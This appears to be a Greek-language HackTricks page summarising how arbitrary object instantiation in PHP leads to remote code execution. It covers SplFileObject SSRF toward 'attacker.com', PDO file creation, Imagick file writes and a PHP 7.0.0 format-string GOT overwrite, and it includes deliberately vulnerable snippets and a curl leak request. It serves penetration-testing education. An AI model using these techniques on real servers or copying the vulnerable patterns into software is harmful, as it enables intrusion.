# PHP - RCE κατάχρηση δημιουργίας αντικειμένων: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Αυτό είναι ουσιαστικά μια περίληψη του [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Εισαγωγή

Η δημιουργία νέων αυθαίρετων αντικειμένων, όπως `new $_GET["a"]($_GET["a"])`, μπορεί να οδηγήσει σε Remote Code Execution (RCE), όπως περιγράφεται σε ένα [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Αυτό το έγγραφο επισημαίνει διάφορες στρατηγικές για την επίτευξη RCE.

## RCE via Custom Classes or Autoloading

Η σύνταξη `new $a($b)` χρησιμοποιείται για να δημιουργήσει ένα αντικείμενο όπου **`$a`** αντιπροσωπεύει το όνομα κλάσης και **`$b`** είναι το πρώτο όρισμα που δίνεται στον constructor. Αυτές οι μεταβλητές μπορούν να προέλθουν από εισόδους χρήστη όπως GET/POST, όπου μπορεί να είναι strings ή arrays, ή από JSON, όπου μπορεί να εμφανίζονται ως άλλοι τύποι.

Εξετάστε το παρακάτω απόσπασμα κώδικα:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Σε αυτή την περίπτωση, η ανάθεση του `$a` σε `App` ή `App2` και του `$b` σε μια εντολή συστήματος (π.χ. `uname -a`) έχει ως αποτέλεσμα την εκτέλεση αυτής της εντολής.

**Συναρτήσεις αυτόματης φόρτωσης** μπορούν να εκμεταλλευτούν αν τέτοιες κλάσεις δεν είναι άμεσα προσβάσιμες. Αυτές οι συναρτήσεις φορτώνουν αυτόματα κλάσεις από αρχεία όταν χρειάζεται και ορίζονται χρησιμοποιώντας `spl_autoload_register` ή `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Η συμπεριφορά του autoloading διαφέρει ανάλογα με την έκδοση PHP, προσφέροντας διαφορετικές δυνατότητες RCE.

## RCE μέσω ενσωματωμένων κλάσεων

Ελλείψει custom classes ή autoloaders, οι ενσωματωμένες κλάσεις PHP (built-in PHP classes) μπορεί να είναι αρκετές για RCE. Ο αριθμός αυτών των κλάσεων κυμαίνεται μεταξύ 100 και 200, ανάλογα με την έκδοση PHP και τα extensions. Μπορούν να απαριθμηθούν χρησιμοποιώντας `get_declared_classes()`.

Οι constructors που είναι ενδιαφέροντες μπορούν να εντοπιστούν μέσω της reflection API, όπως φαίνεται στο παρακάτω παράδειγμα και στο link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE μέσω συγκεκριμένων μεθόδων περιλαμβάνει:**

### **SSRF + Phar Deserialization**

Η κλάση `SplFileObject` επιτρέπει SSRF μέσω του constructor της, επιτρέποντας συνδέσεις προς οποιοδήποτε URL:
```php
new SplFileObject('http://attacker.com/');
```
Το SSRF μπορεί να οδηγήσει σε deserialization attacks σε εκδόσεις του PHP πριν από την 8.0 χρησιμοποιώντας το πρωτόκολλο Phar.

### **Εκμετάλλευση PDOs**

Ο PDO class constructor επιτρέπει συνδέσεις σε βάσεις δεδομένων μέσω DSN strings, ενδεχομένως επιτρέποντας δημιουργία αρχείων ή άλλες αλληλεπιδράσεις:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Οι εκδόσεις του PHP έως την 5.3.22 και την 5.4.12 ήταν ευάλωτες σε XXE επιθέσεις μέσω των constructors `SoapClient` και `SimpleXMLElement`, ανάλογα με την έκδοση του libxml2.

## RCE via Imagick Extension

Κατά την ανάλυση των εξαρτήσεων του έργου, διαπιστώθηκε ότι η **Imagick** μπορούσε να αξιοποιηθεί για **command execution** με τη δημιουργία νέων αντικειμένων. Αυτό παρέχει δυνατότητα εκμετάλλευσης ευπαθειών.

### VID parser

Εντοπίστηκε ότι ο VID parser έχει τη δυνατότητα να γράφει περιεχόμενο σε οποιαδήποτε καθορισμένη διαδρομή στο σύστημα αρχείων. Αυτό μπορεί να οδηγήσει στην τοποθέτηση ενός PHP shell σε έναν web-accessible κατάλογο, επιτυγχάνοντας Remote Code Execution (RCE).

#### VID Parser + File Upload

Σημειώνεται ότι το PHP αποθηκεύει προσωρινά τα ανεβασμένα αρχεία στο `/tmp/phpXXXXXX`. Ο VID parser στην Imagick, χρησιμοποιώντας το πρωτόκολλο **msl**, μπορεί να χειριστεί wildcards σε μονοπάτια αρχείων, διευκολύνοντας τη μεταφορά του προσωρινού αρχείου σε επιλεγμένη τοποθεσία. Αυτή η μέθοδος προσφέρει μια επιπλέον προσέγγιση για την επίτευξη arbitrary file writing μέσα στο σύστημα αρχείων.

### PHP Crash + Brute Force

Μια μέθοδος που περιγράφεται στο [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) περιλαμβάνει το ανέβασμα αρχείων που προκαλούν crash του server πριν τη διαγραφή. Με brute-forcing του ονόματος του προσωρινού αρχείου, γίνεται δυνατό για την Imagick να εκτελέσει arbitrary PHP code. Ωστόσο, αυτή η τεχνική βρέθηκε αποτελεσματική μόνο σε μία παλιά έκδοση του ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Όταν η είσοδος χρήστη ελέγχει το όνομα κλάσης (π.χ., `new $_GET['model']()`), το PHP 7.0.0 εισήγαγε ένα παροδικό bug κατά τη refactor του `Throwable` όπου η engine κατά λάθος αντιμετώπιζε το όνομα κλάσης σαν printf format string κατά την επίλυση. Αυτό επιτρέπει τα κλασικά printf-style primitives μέσα στο PHP: leaks με `%p`, έλεγχο του write-count με width specifiers, και arbitrary writes με `%n` σε in-process pointers (π.χ. GOT entries σε ELF builds).

Ελάχιστο αναπαραγωγικό ευάλωτο δείγμα:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Περίγραμμα εκμετάλλευσης (από την αναφορά):
- Leak addresses via `%p` in the class name to find a writable target:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Use positional parameters and width specifiers to set an exact byte-count, then `%n` to write that value to an address reachable on the stack, aiming at a GOT slot (e.g., `free`) to partially overwrite it to `system`.
- Trigger the hijacked function by passing a class name containing a shell pipe to reach `system("id")`.

Σημειώσεις:
- Λειτουργεί μόνο στο PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); διορθώθηκε σε επόμενες εκδόσεις. Severity: critical if arbitrary class instantiation exists.
- Typical payloads chain many `%p` to walk the stack, then `%.<width>d%<pos>$n` to land the partial overwrite.

## Αναφορές

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
